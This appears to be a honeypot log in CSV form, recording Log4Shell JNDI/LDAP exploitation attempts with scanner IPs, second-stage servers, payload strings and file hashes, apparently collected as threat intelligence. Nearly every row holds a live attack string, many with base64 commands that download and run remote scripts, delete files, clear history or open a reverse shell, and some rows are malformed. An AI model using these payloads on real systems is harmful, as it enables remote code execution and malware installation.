date,scanner,second_stage,exploit_url,sha256
,157.245.108.125,167.99.32.139:1389,jndi:ldap://167.99.32.139:1389/Basic/ReverseShell/167.99.32.139/9999
,195.54.160.149,195.54.160.149:12344,jndi:ldap:%2F%2F195.54.160.149:12344%2FBasic%2FCommand%2FBase64%2FKGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC81NC4yMTUuNTYuMTYxOjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzU0LjIxNS41Ni4xNjE6ODApfGJhc2g=%7D
,157.90.35.190,162.55.90.26,jndi:ldap://162.55.90.26/920074401/C
,143.244.156.104,135.148.143.217:1389,jndi:ldap://135.148.143.217:1389/Basic/Command/Base64/d2dldCBodHRwOi8vMTUyLjY3LjYzLjE1MC9weTsgY3VybCAtTyBodHRwOi8vMTUyLjY3LjYzLjE1MC9weTsgY2htb2QgNzc3IHB5OyAuL3B5IHJjZS54ODY=,9691061f778674bb4e28fb6a2d88a2fe72711ae71f3d2f4137654e1b5e91c9d2
,143.244.156.104,135.148.143.217:1389,jndi:ldap://135.148.143.217:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTUyLjY3LjYzLjE1MC9weTsgY3VybCAtTyBodHRwOi8vMTUyLjY3LjYzLjE1MC9weTsgY2htb2QgNzc3IHB5OyAuL3B5IHJjZS54ODY=,9691061f778674bb4e28fb6a2d88a2fe72711ae71f3d2f4137654e1b5e91c9d2
,5.157.38.50,5.101.118.127:1389,${jndi:ldap://5.101.118.127:1389/Exploit}
,167.71.175.10,5.101.118.127:1389,${jndi:ldap://5.101.118.127:1389/Exploit}
,167.71.175.10,5.101.118.127:1389,http://honeypotip/?v=$%7Bjndi:ldap:%2F%2F5.101.118.127:1389%2FExploit%7D
,167.71.175.10,5.101.118.127:1389,http://honeypotip/?id=$%7Bjndi:ldap:%2F%2F5.101.118.127:1389%2FExploit%7D
,167.71.175.10,5.101.118.127:1389,http://honeypotip/?page=$%7Bjndi:ldap:%2F%2F5.101.118.127:1389%2FExploit%7D
,167.71.175.10,5.101.118.127:1389,http://honeypotip/?s=$%7Bjndi:ldap:%2F%2F5.101.118.127:1389%2FExploit%7D
,77.37.134.80,142.93.172.227:1389,${jndi:ldap://142.93.172.227:1389/Exploit},8dd2f5868d391f25b9a03bb4071ce9a6b27a7ae2deb6c4871fc87020b13ba459
,77.37.134.80,142.93.172.227:1389,http://honeypotip/?s=$%7Bjndi:ldap:%2F%2F142.93.172.227:1389%2FExploit%7D,8dd2f5868d391f25b9a03bb4071ce9a6b27a7ae2deb6c4871fc87020b13ba459
,77.37.134.80,142.93.172.227:1389,${jndi:ldap://142.93.172.227:1389/Exploit},8dd2f5868d391f25b9a03bb4071ce9a6b27a7ae2deb6c4871fc87020b13ba459
,77.37.134.80,40.76.9.118,http://40.76.9.118:80/wp-content/themes/twentysixteen/Exploit.class,64d85a180116e4258c64afc316a254b3f8dbe2960f150221ced9d4ba1c5c3b4b
,77.37.134.80,51.250.28.5,http://51.250.28.5/.l/log,fc669beaa2f84e08fcea799498c85374e1a3406441ed9aa5d53b7667265bff41
,77.37.134.80,51.250.28.5,http://51.250.28.5/.l/pty3,c01fa3e23232da79e1ee1e722050ab8ac09b90bfebbf93a440bc1316ef7a127c
,77.37.134.80,51.250.28.5,http://51.250.28.5/.l/pty4,601a9a769138a444dd359058dee0b4d797f8aef42d7c22dfb469bbaf55695ed6
,77.37.134.80,150.60.139.51,http://150.60.139.51:80/wp-content/themes/twentyseventeen/s.cmd,bfb7537dc73448e36c62fcd0ee7a1d4269290df5744628a9c2f021f36fb8755c
,77.37.134.80,178.62.105.90,http://178.62.105.90/wp-content/themes/Grimag/ldm,8e10768d8dfd47c41420e683c6010c3d822783add70c016d3608f0291743cdcc
25/Dec/2021 04:14:12,170.210.45.163,121.140.99.236:1389,/${jndi:ldap://121.140.99.236:1389/Exploit},8dd2f5868d391f25b9a03bb4071ce9a6b27a7ae2deb6c4871fc87020b13ba459
021-12-31 19:34:49.229,199.127.60.104,2.58.149.206,t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//2.58.149.206:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY3VybCAtTyBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsg,9691061f778674bb4e28fb6a2d88a2fe72711ae71f3d2f4137654e1b5e91c9d2
1641662016,18.236.158.106,c7cghgk5unlhe069j920c8chcoyb8ncmn.interact.sh,${jndi:ldap://${hostName}.c7cghgk5unlhe069j920c8chcoyb8ncmn.interact.sh/a},
2022-01-08T17:13:36,18.236.158.106:51713,c7cghgk5unlhe069j920c8chcoyb8ncmr.interact.sh,${jndi:ldap://${hostName}.accept.c7cghgk5unlhe069j920c8chcoyb8ncmr.interact.sh}
2022-01-08T17:13:36,18.236.158.106:51713,c7cghgk5unlhe069j920c8chcoyb8ncmr.interact.sh,${jndi:ldap://${hostName}.acceptencoding.c7cghgk5unlhe069j920c8chcoyb8ncmg.interact.sh}
2022-01-08T17:13:36,18.236.158.106:51713,c7cghgk5unlhe069j920c8chcoyb8ncmr.interact.sh,${jndi:ldap://${hostName}.acceptlanguage.c7cghgk5unlhe069j920c8chcoyb8ncme.interact.sh}
2022-01-08T17:13:36,18.236.158.106:51713,c7cghgk5unlhe069j920c8chcoyb8ncmr.interact.sh,${jndi:ldap://${hostName}.accesscontrolrequestheaders.c7cghgk5unlhe069j920c8chcoyb8ncmk.interact.sh}
2022-01-08T17:13:36,18.236.158.106:51713,c7cghgk5unlhe069j920c8chcoyb8ncmr.interact.sh,${jndi:ldap://${hostName}.accesscontrolrequestmethod.c7cghgk5unlhe069j920c8chcoyb8ncmc.interact.sh}
2022-01-08T17:13:36,18.236.158.106:51713,c7cghgk5unlhe069j920c8chcoyb8ncmr.interact.sh,${jndi:ldap://${hostName}.cookiename.c7cghgk5unlhe069j920c8chcoyb8ncm1.interact.sh}=${jndi:ldap://${hostName}.cookievalue.c7cghgk5unlhe069j920c8chcoyb8ncmw.interact.sh}
2022-01-08T17:13:36,18.236.158.106:51713,c7cghgk5unlhe069j920c8chcoyb8ncmr.interact.sh,${jndi:ldap://${hostName}.location.c7cghgk5unlhe069j920c8chcoyb8ncms.interact.sh}
2022-01-08T17:13:36,18.236.158.106:51713,c7cghgk5unlhe069j920c8chcoyb8ncmr.interact.sh,${jndi:ldap://${hostName}.origin.c7cghgk5unlhe069j920c8chcoyb8ncma.interact.sh}
2022-01-08T17:13:36,18.236.158.106:51713,c7cghgk5unlhe069j920c8chcoyb8ncmr.interact.sh,${jndi:ldap://${hostName}.referer.c7cghgk5unlhe069j920c8chcoyb8ncm4.interact.sh}
2022-01-08T17:13:36,18.236.158.106:51713,c7cghgk5unlhe069j920c8chcoyb8ncmr.interact.sh,${jndi:ldap://${hostName}.upgradeinsecurerequests.c7cghgk5unlhe069j920c8chcoyb8ncmh.interact.sh}
2022-01-08T17:13:36,18.236.158.106:51713,c7cghgk5unlhe069j920c8chcoyb8ncmr.interact.sh,${jndi:ldap://${hostName}.useragent.c7cghgk5unlhe069j920c8chcoyb8ncm6.interact.sh}
2022-01-08T17:13:36,18.236.158.106:51713,c7cghgk5unlhe069j920c8chcoyb8ncmr.interact.sh,${jndi:ldap://${hostName}.xapiversion.c7cghgk5unlhe069j920c8chcoyb8nccy.interact.sh}
2022-01-08T17:13:36,18.236.158.106:51713,c7cghgk5unlhe069j920c8chcoyb8ncmr.interact.sh,${jndi:ldap://${hostName}.xcsrftoken.c7cghgk5unlhe069j920c8chcoyb8nccn.interact.sh}
2022-01-08T17:13:36,18.236.158.106:51713,c7cghgk5unlhe069j920c8chcoyb8ncmr.interact.sh,${jndi:ldap://${hostName}.xdruidcomment.c7cghgk5unlhe069j920c8chcoyb8nccr.interact.sh}
2022-01-08T17:13:36,18.236.158.106:51713,c7cghgk5unlhe069j920c8chcoyb8ncmr.interact.sh,${jndi:ldap://${hostName}.xforwardedfor.c7cghgk5unlhe069j920c8chcoyb8nccg.interact.sh}
2022-01-08T17:13:36,18.236.158.106:51713,c7cghgk5unlhe069j920c8chcoyb8ncmr.interact.sh,${jndi:ldap://${hostName}.xorigin.c7cghgk5unlhe069j920c8chcoyb8ncce.interact.sh}
2022-01-08T17:13:36,18.236.158.106:51713,c7cghgk5unlhe069j920c8chcoyb8ncmr.interact.sh,Bearer ${jndi:ldap://${hostName}.authenticationbearer.c7cghgk5unlhe069j920c8chcoyb8ncmo.interact.sh}
2022-01-08T17:13:36,18.236.158.106:51713,c7cghgk5unlhe069j920c8chcoyb8ncmr.interact.sh,/?x=${jndi:ldap://${hostName}.c7cghgk5unlhe069j920c8chcoyb8ncmn.interact.sh/a}
2022-01-11T17:43:08,108.52.161.90:64372,45.153.240.94:1389,${jndi:ldap://45.153.240.94:1389/8rjbzw}
2022-01-11T17:43:08,108.52.161.90:64372,45.153.240.94:1389,/?q=%24%7Bjndi%3Aldap%3A%2F%2F45.153.240.94%3A1389%2F8rjbzw%7D
2022-01-12T06:55:54,165.232.155.141:54842,137.184.40.48:1389,t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//137.184.40.48:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTU4LjEwMS4xMTguMjM2L3NldHVwOyBjdXJsIC1PIGh0dHA6Ly8xNTguMTAxLjExOC4yMzYvc2V0dXA7IGNobW9kIDc3NyBzZXR1cDsgLi9zZXR1cCBleHBsb2l0}')
2022-01-12T06:55:54,165.232.155.141:54842,137.184.40.48:1389,/?test=t(%27$%7B$%7Benv:NaN:-j%7Dndi$%7Benv:NaN:-:%7D$%7Benv:NaN:-l%7Ddap$%7Benv:NaN:-:%7D//137.184.40.48:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTU4LjEwMS4xMTguMjM2L3NldHVwOyBjdXJsIC1PIGh0dHA6Ly8xNTguMTAxLjExOC4yMzYvc2V0dXA7IGNobW9kIDc3NyBzZXR1cDsgLi9zZXR1cCBleHBsb2l0%7D%27)
2022-01-15T03:58:41,207.244.102.201:42702,c7gi8p0gge9ilo482t3gc8trcheb6nrtg.oast.site,OFBiz.Visitor=${jndi:ldap://${hostName}.c7gi8p0gge9ilo482t3gc8trcheb6nrtg.oast.site}
2022-01-15T03:58:42,207.244.102.201:49352,None,/solr/admin/collections?action=$%7Bjndi:ldap://$%7BhostName%7D.c7gi8p0gge9ilo482t3gc8trcheb6nfdq.oast.site/a%7D
2022-01-17T00:37:17,167.71.176.174:43856,165.22.33.143:1389,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//165.22.33.143:1389/TomcatBypass/Command/Base64/Y2QgL3RtcDsgd2dldCBodHRwOi8vMTQ5LjU2LjQyLjI0NC9pbml0ZCAtTyAvdG1wL2luaXRkOyBjdXJsIGh0dHA6Ly8xNDkuNTYuNDIuMjQ0L2luaXRkIC1vIC90bXAvaW5pdGQ7IGNobW9kIDc3NyAvdG1wL2luaXRkOyBzaCAvdG1wL2luaXRkOyBybSAtcmYgL3RtcC9pbml0ZCAvdG1wL2luaXRkLjE7IHJtIC1yZiAvdG1wL2luaXRkLio=}')
2022-01-17T02:32:00,167.71.176.174:52702,165.22.33.143:1389,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//165.22.33.143:1389/TomcatBypass/Command/Base64/Y2QgL3RtcDsgd2dldCBodHRwOi8vMTQ5LjU2LjQyLjI0NC9pbml0ZCAtTyAvdG1wL2luaXRkOyBjdXJsIGh0dHA6Ly8xNDkuNTYuNDIuMjQ0L2luaXRkIC1vIC90bXAvaW5pdGQ7IGNobW9kIDc3NyAvdG1wL2luaXRkOyBzaCAvdG1wL2luaXRkOyBybSAtcmYgL3RtcC9pbml0ZCAvdG1wL2luaXRkLjE7IHJtIC1yZiAvdG1wL2luaXRkLio=}')
2022-01-17T09:13:37,104.131.26.5:47758,20.206.99.231:1389,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//20.206.99.231:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzIuNTYuNTYuMTE3LzhVc0Euc2g7IGN1cmwgLU8gaHR0cDovLzIuNTYuNTYuMTE3LzhVc0Euc2g7IGNobW9kIDc3NyA4VXNBLnNoOyBzaCA4VXNBLnNo}')
2022-01-17T13:18:30,167.71.176.174:48722,165.22.33.143:1389,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//165.22.33.143:1389/TomcatBypass/Command/Base64/Y2QgL3RtcDsgd2dldCBodHRwOi8vMTQ5LjU2LjQyLjI0NC9pbml0ZCAtTyAvdG1wL2luaXRkOyBjdXJsIGh0dHA6Ly8xNDkuNTYuNDIuMjQ0L2luaXRkIC1vIC90bXAvaW5pdGQ7IGNobW9kIDc3NyAvdG1wL2luaXRkOyBzaCAvdG1wL2luaXRkOyBybSAtcmYgL3RtcC9pbml0ZCAvdG1wL2luaXRkLjE7IHJtIC1yZiAvdG1wL2luaXRkLio=}')
2022-01-17T20:24:39,98.0.242.10:41180,45.12.32.61:1389,${jndi:ldap://45.12.32.61:1389/OS=${sys:os.name}/HN=${env:HOSTNAME}/feb12a13-5fe3-429a-bd12-ed0c72e2ad20}
2022-01-17T20:24:39,98.0.242.10:41180,45.12.32.61:1389,/?q=%24%7Bjndi%3Aldap%3A%2F%2F45.12.32.61%3A1389%2FOS%3D%24%7Bsys%3Aos.name%7D%2FHN%3D%24%7Benv%3AHOSTNAME%7D%2Ffeb12a13-5fe3-429a-bd12-ed0c72e2ad20%7D
2022-01-17T23:05:58,167.71.176.174:43230,165.22.33.143:1389,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//165.22.33.143:1389/TomcatBypass/Command/Base64/Y2QgL3RtcDsgd2dldCBodHRwOi8vMTY3LjExNC4xMzUuMTE1L3NzaGQgLU8gL3RtcC9zc2hkOyBjdXJsIGh0dHA6Ly8xNjcuMTE0LjEzNS4xMTUvc3NoZCAtbyAvdG1wL3NzaGQ7IGNobW9kIDc3NyAvdG1wL3NzaGQ7IHNoIC90bXAvc3NoZDsgcm0gLXJmIC90bXAvc3NoZCAvdG1wL3NzaGQuMTsgcm0gLXJmIC90bXAvc3NoZC4q}')
2022-01-18T10:32:40,167.71.176.174:43860,165.22.33.143:1389,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//165.22.33.143:1389/TomcatBypass/Command/Base64/Y2QgL3RtcDsgd2dldCBodHRwOi8vMTY3LjExNC4xMzUuMTE1L3NzaGQgLU8gL3RtcC9zc2hkOyBjdXJsIGh0dHA6Ly8xNjcuMTE0LjEzNS4xMTUvc3NoZCAtbyAvdG1wL3NzaGQ7IGNobW9kIDc3NyAvdG1wL3NzaGQ7IHNoIC90bXAvc3NoZDsgcm0gLXJmIC90bXAvc3NoZCAvdG1wL3NzaGQuMTsgcm0gLXJmIC90bXAvc3NoZC4q}')
2022-01-18T13:17:14,167.71.176.174:35098,165.22.33.143:1389,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//165.22.33.143:1389/TomcatBypass/Command/Base64/Y2QgL3RtcDsgd2dldCBodHRwOi8vMTY3LjExNC4xMzUuMTE1L3NzaGQgLU8gL3RtcC9zc2hkOyBjdXJsIGh0dHA6Ly8xNjcuMTE0LjEzNS4xMTUvc3NoZCAtbyAvdG1wL3NzaGQ7IGNobW9kIDc3NyAvdG1wL3NzaGQ7IHNoIC90bXAvc3NoZDsgcm0gLXJmIC90bXAvc3NoZCAvdG1wL3NzaGQuMTsgcm0gLXJmIC90bXAvc3NoZC4q}')
2022-01-18T19:14:04,167.71.176.174:59934,165.22.33.143:1389,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//165.22.33.143:1389/TomcatBypass/Command/Base64/Y2QgL3RtcDsgd2dldCBodHRwOi8vMTY3LjExNC4xMzUuMTE1L3NzaGQgLU8gL3RtcC9zc2hkOyBjdXJsIGh0dHA6Ly8xNjcuMTE0LjEzNS4xMTUvc3NoZCAtbyAvdG1wL3NzaGQ7IGNobW9kIDc3NyAvdG1wL3NzaGQ7IHNoIC90bXAvc3NoZDsgcm0gLXJmIC90bXAvc3NoZCAvdG1wL3NzaGQuMTsgcm0gLXJmIC90bXAvc3NoZC4q}')
2022-01-18T22:22:36,167.71.176.174:44468,165.22.33.143:1389,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//165.22.33.143:1389/TomcatBypass/Command/Base64/Y2QgL3RtcDsgd2dldCBodHRwOi8vMTY3LjExNC4xMzUuMTE1L3NzaGQgLU8gL3RtcC9zc2hkOyBjdXJsIGh0dHA6Ly8xNjcuMTE0LjEzNS4xMTUvc3NoZCAtbyAvdG1wL3NzaGQ7IGNobW9kIDc3NyAvdG1wL3NzaGQ7IHNoIC90bXAvc3NoZDsgcm0gLXJmIC90bXAvc3NoZCAvdG1wL3NzaGQuMTsgcm0gLXJmIC90bXAvc3NoZC4q}')
2022-01-21T02:53:29,159.223.171.171:60944,None,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//13.78.223.142:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzE5Mi4zLjEuMTIvOFVzQTEuc2g7IGN1cmwgLU8gaHR0cDovLzE5Mi4zLjEuMTIvOFVzQTEuc2g7IGNobW9kIDc3NyA4VXNBMS5zaDsgc2ggOFVzQTEuc2g=}')
2022-01-21T04:51:42,35.229.71.66:53170,None,/?id=t(%27$%7B$%7Benv:BARFOO:-j%7Dndi$%7Benv:BARFOO:-:%7D$%7Benv:BARFOO:-l%7Ddap$%7Benv:BARFOO:-:%7D//5.181.80.103:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzE5Mi45NS41MC4yMjgvYmlucy5zaDsgY2htb2QgNzc3IGJpbnMuc2g7IHNoIGJpbnMuc2g7IHRmdHAgMTkyLjk1LjUwLjIyOCAtYyBnZXQgdGZ0cDEuc2g7IGNobW9kIDc3NyB0ZnRwMS5zaDsgc2ggdGZ0cDEuc2g7IHRmdHAgLXIgdGZ0cDIuc2ggLWcgMTkyLjk1LjUwLjIyODsgY2htb2QgNzc3IHRmdHAyLnNoOyBzaCB0ZnRwMi5zaDsgcm0gLXJmICo=%7D%27)
2022-01-21T04:51:42,35.229.71.66:53170,None,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//5.181.80.103:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzE5Mi45NS41MC4yMjgvYmlucy5zaDsgY2htb2QgNzc3IGJpbnMuc2g7IHNoIGJpbnMuc2g7IHRmdHAgMTkyLjk1LjUwLjIyOCAtYyBnZXQgdGZ0cDEuc2g7IGNobW9kIDc3NyB0ZnRwMS5zaDsgc2ggdGZ0cDEuc2g7IHRmdHAgLXIgdGZ0cDIuc2ggLWcgMTkyLjk1LjUwLjIyODsgY2htb2QgNzc3IHRmdHAyLnNoOyBzaCB0ZnRwMi5zaDsgcm0gLXJmICo=}')
2022-01-21T20:23:33,34.75.220.108:53508,None,/?id=t(%27$%7B$%7Benv:BARFOO:-j%7Dndi$%7Benv:BARFOO:-:%7D$%7Benv:BARFOO:-l%7Ddap$%7Benv:BARFOO:-:%7D//5.181.80.103:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzUxLjE2MS42NC4xOTgvaW5zdGFsbC5zaDsgY2htb2QgNzc3IGluc3RhbGwuc2g7IHNoIGluc3RhbGwuc2g7IHRmdHAgNTEuMTYxLjY0LjE5OCAtYyBnZXQgdGZ0cDEuc2g7IGNobW9kIDc3NyB0ZnRwMS5zaDsgc2ggdfCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzE5Mi45NS41MC4yMjgvYmlucy5zaDsgY2htb2QgNzc3IGJpbnMuc2g7IHNoIGJpbnMuc2g7IHRmdHAgMTkyLjk1LjUwLjIyOCAtYyBnZXQgdGZ0cDEuc2g7IGNobW9kIDc3NyB0ZnRwMS5zaDsgc2ggdGZ0cDEuc2g7IHRmdHAgLXIgdGZ0cDIuc2ggLWcgMTkyLjk1LjUwLjIyODsgY2htb2QgNzc3IHRmdHAyLnNoOyBzaCB0ZnRwMi5zaDsgcm0gLXJmICo=%7D%27)
2022-01-21T04:51:42,35.229.71.66:53170,80.,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//5.181.80.103:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzE5Mi45NS41MC4yMjgvYmlucy5zaDsgY2htb2QgNzc3IGJpbnMuc2g7IHNoIGJpbnMuc2g7IHRmdHAgMTkyLjk1LjUwLjIyOCAtYyBnZXQgdGZ0cDEuc2g7IGNobW9kIDc3NyB0ZnRwMS5zaDsgc2ggdGZ0cDEuc2g7IHRmdHAgLXIgdGZ0cDIuc2ggLWcgMTkyLjk1LjUwLjIyODsgY2htb2QgNzc3IHRmdHAyLnNoOyBzaCB0ZnRwMi5zaDsgcm0gLXJmICo=}')
2022-01-21T20:23:33,34.75.220.108:53508,80.,/?id=t(%27$%7B$%7Benv:BARFOO:-j%7Dndi$%7Benv:BARFOO:-:%7D$%7Benv:BARFOO:-l%7Ddap$%7Benv:BARFOO:-:%7D//5.181.80.103:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzUxLjE2MS42NC4xOTgvaW5zdGFsbC5zaDsgY2htb2QgNzc3IGluc3RhbGwuc2g7IHNoIGluc3RhbGwuc2g7IHRmdHAgNTEuMTYxLjY0LjE5OCAtYyBnZXQgdGZ0cDEuc2g7IGNobW9kIDc3NyB0ZnRwMS5zaDsgc2ggdGZ0cDEuc2g7IHRmdHAgLXIgdGZ0cDIuc2ggLWcgNTEuMTYxLjY0LjE5ODsgY2htb2QgNzc3IHRmdHAyLnNoOyBzaCB0ZnRwMi5zaDsgcm0gLXJmICo=%7D%27)
2022-01-21T20:23:33,34.75.220.108:53508,80.,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//5.181.80.103:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzUxLjE2MS42NC4xOTgvaW5zdGFsbC5zaDsgY2htb2QgNzc3IGluc3RhbGwuc2g7IHNoIGluc3RhbGwuc2g7IHRmdHAgNTEuMTYxLjY0LjE5OCAtYyBnZXQgdGZ0cDEuc2g7IGNobW9kIDc3NyB0ZnRwMS5zaDsgc2ggdGZ0cDEuc2g7IHRmdHAgLXIgdGZ0cDIuc2ggLWcgNTEuMTYxLjY0LjE5ODsgY2htb2QgNzc3IHRmdHAyLnNoOyBzaCB0ZnRwMi5zaDsgcm0gLXJmICo=}')
2022-01-21T23:03:29,159.223.171.171:53956,223.,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//13.78.223.142:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzUxLjE2MS42NC4xOTgvaW5zdGFsbC5zaDsgY2htb2QgNzc3IGluc3RhbGwuc2g7IHNoIGluc3RhbGwuc2g=}')
2022-01-22T01:28:24,104.196.98.126:36542,80.,/?id=t(%27$%7B$%7Benv:BARFOO:-j%7Dndi$%7Benv:BARFOO:-:%7D$%7Benv:BARFOO:-l%7Ddap$%7Benv:BARFOO:-:%7D//5.181.80.103:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IGN1cmwgaHR0cDovLzE0NS4yMzkuMjM0LjE1NC9iaW5zLnNoIC1vIGJpbnMuc2g7IHdnZXQgaHR0cDovLzE0NS4yMzkuMjM0LjE1NC9iaW5zLnNoOyBjaG1vZCA3NzcgYmlucy5zaDsgLi9iaW5zLnNoOyBybSAtcmYgYmlucy5zaDsgaGlzdG9yeSAtYw==%7D%27)
2022-01-22T01:28:24,104.196.98.126:36542,80.,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//5.181.80.103:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IGN1cmwgaHR0cDovLzE0NS4yMzkuMjM0LjE1NC9iaW5zLnNoIC1vIGJpbnMuc2g7IHdnZXQgaHR0cDovLzE0NS4yMzkuMjM0LjE1NC9iaW5zLnNoOyBjaG1vZCA3NzcgYmlucy5zaDsgLi9iaW5zLnNoOyBybSAtcmYgYmlucy5zaDsgaGlzdG9yeSAtYw==}')
2022-01-24T18:25:00,144.22.255.144:45816,150.136.111.68,t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTU4LjEwMS4xMTguMjM2L3NldHVwOyBjdXJsIC1PIGh0dHA6Ly8xNTguMTAxLjExOC4yMzYvc2V0dXA7IGNobW9kIDc3NyBzZXR1cDsgLi9zZXR1cCBleHBsb2l0}')
2022-01-26T13:29:06,98.0.242.10:51924,32.,${jndi:ldap://45.12.32.14:1389/a}
2022-01-27T01:57:36,159.65.242.171:38668,106.,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//20.206.106.60:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzEzNS4xNDguMTA0LjE3NC84VXNBLnNoOyBjdXJsIC1PIGh0dHA6Ly8xMzUuMTQ4LjEwNC4xNzQvOFVzQS5zaDsgY2htb2QgNzc3IDhVc0Euc2g7IHNoIDhVc0Euc2g=}')
2022-01-27T02:02:22,159.65.242.171:40900,106.,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//20.206.106.60:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzEzNS4xNDguMTA0LjE3NC84VXNBLnNoOyBjdXJsIC1PIGh0dHA6Ly8xMzUuMTQ4LjEwNC4xNzQvOFVzQS5zaDsgY2htb2QgNzc3IDhVc0Euc2g7IHNoIDhVc0Euc2g=}')
2022-01-27T17:29:21,34.139.107.170:52346,80.,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//5.181.80.103:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IGN1cmwgaHR0cDovLzE5Mi45NS41MC4yMjgvYmlucy5zaCAtbyBiaW5zLnNoOyB3Z2V0IGh0dHA6Ly8xOTIuOTUuNTAuMjI4L2JpbnMuc2g7IGNobW9kIDc3NyBiaW5zLnNoOyBzaCBiaW5zLnNoOyBybSAtcmYgYmlucy5zaDsgaGlzdG9yeSAtYyA=}')
